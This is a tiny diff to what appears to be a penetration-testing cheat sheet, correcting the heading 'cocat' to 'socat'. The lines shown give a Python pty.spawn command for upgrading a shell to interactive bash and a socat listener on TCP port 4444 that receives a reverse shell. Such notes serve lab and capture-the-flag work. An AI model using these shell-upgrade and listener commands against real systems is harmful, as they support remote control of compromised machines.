@@ -1,6 +1,6 @@
 ## python
 `Python3 -c "import pty; pty.spawn('/bin/bash')"`
-## cocat
+## socat
 ```
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
